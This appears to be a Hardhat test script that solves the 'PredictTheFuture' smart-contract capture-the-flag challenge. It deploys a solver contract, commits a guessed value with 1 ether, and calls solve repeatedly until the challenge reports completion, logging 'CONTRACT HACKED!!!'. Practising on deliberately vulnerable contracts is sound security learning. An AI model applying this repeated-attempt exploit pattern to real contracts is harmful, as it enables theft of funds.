const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0xbBB4CfC658645716D210683F40420Ec9E8640e8d";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("PredictTheFutureChallenge");
  contract = factory.attach(CHALLENGE_ADDRESS);
});

it("PredictTheFuture", async function () {
  const futureSolverFactory = await ethers.getContractFactory(
    "PredictTheFutureSolution"
  );
  console.log("deploying the solver contract");
  futureSolver = await futureSolverFactory.deploy(CHALLENGE_ADDRESS);
  await futureSolver.deployed();
  console.log("solver contract deployed");
  var attemptNumber = 0;
  const guess = 9;
  console.log("submitting the guess as :", guess);
  const lockInGuesTx = await futureSolver.commit(guess, {
    value: ethers.utils.parseEther("1.0"),
    gasLimit: 3e6,
  });
  console.log("committing guess");
  await lockInGuesTx.wait();
  console.log("guess committed");
  var hacked = false;
  while (attemptNumber < 20) {
    console.log("attempt number :", attemptNumber);
    try {
      const tx1 = await futureSolver.solve({ gasLimit: 3e6 });
      await tx1.wait();
      console.log("attempt submitted");
      const isComplete = await contract.isComplete();
      if (isComplete == true) {
        console.log("CONTRACT HACKED!!!");
        hacked = true;
        break;
      }
    } catch (error) {
      console.log(error.message);
    }
    attemptNumber++;
  }
  if (hacked) {
    util.updateTotalPoints(scriptName);
  }
});
